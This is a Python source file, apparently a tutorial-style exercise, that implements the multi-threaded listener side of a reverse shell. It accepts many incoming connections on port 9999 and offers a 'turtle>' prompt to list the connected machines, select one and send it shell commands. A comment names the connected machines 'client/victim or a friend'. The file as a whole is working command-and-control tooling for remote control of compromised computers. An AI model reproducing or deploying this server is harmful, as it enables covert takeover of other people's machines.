import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREAD = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connection = []
all_address = []


# create a socket ( connect two computers)


def create_socket():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as message:
        print('Socket error :' + str(message))


# Binding the socket and listening for connection


def bind_socket():
    try:
        global host
        global port
        global s
        print('Binding Port: %d' % port)
        s.bind((host, port))
        s.listen(5)

    except socket.error as message:
        print('Socket error :' + str(message) + '\n' + 'Retrying....')
        bind_socket()  # recursion


#   VERSION 1 : NO MULTI THREADING
# Accept the connection with a client and socket it must be listening


# def socket_accept():
#     conn, address = s.accept()
#     print('IP |' + address[0] + ' PORT' + str(address[1]))
#     send_command(conn)
#     conn.close()

# Send command to friend


# def send_command(conn):
#     while True:
#         cmd = input()

# if cmd == 'quit':
#     conn.close()
#     s.close()
#     sys.exit(0)
# if len(str.encode(cmd)) > 0:
#     conn.send(str.encode(cmd))
#     client_response = str(conn.recv(1024), 'utf-8')
#     print(client_response, end='')

# def main():
#     create_socket()
#     bind_socket()
#     socket_accept()

# main()

# VERSION 2 MULTI-THREADING
# closing previous connection when server.py is restarted

def accepting_connections():
    for c in all_connection:
        c.close()

    del all_connection[:]
    del all_address[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1)  # prevents timeout

            all_connection.append(conn)
            all_address.append(address)

            print("Connection has been established :" + address[0] + '\nWelcome To FriendsX\n')

        except:
            print("Error accepting connections")


# 2nd thread functions - 1) See all the clients 2) Select a client 3) Send commands to the connected client
# Interactive prompt for sending commands
# turtle> list
# 0 Friend-A Port
# 1 Friend-B Port
# 2 Friend-C Port
# turtle> select 1
# 192.168.0.112> dir


def start_turtle():

    while True:
        cmd = input('turtle> ')
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)

        else:
            print("Command not recognized")


# Display all current active connections with client

def list_connections():
    results = ''

    for i, conn in enumerate(all_connection):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del all_connection[i]
            del all_address[i]
            continue

        results = str(i) + "   " + str(all_address[i][0]) + "   " + str(all_address[i][1]) + "\n"

    print("----Clients----" + "\n" + results)


# Selecting the target
def get_target(cmd):
    try:
        target = cmd.replace('select ', '')  # target = id
        target = int(target)
        conn = all_connection[target]
        print("You are now connected to :" + str(all_address[target][0]))
        print(str(all_address[target][0]) + ">", end="")
        return conn
        # 192.168.0.4> dir

    except:
        print("Selection not valid")
        return None


# Send commands to client/victim or a friend
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")
        except:
            print("Error sending commands")
            break


# Create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREAD):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


# Do next job that is in the queue (handle connections, send commands)
def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connections()
        if x == 2:
            start_turtle()

        queue.task_done()


def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()


create_workers()
create_jobs()

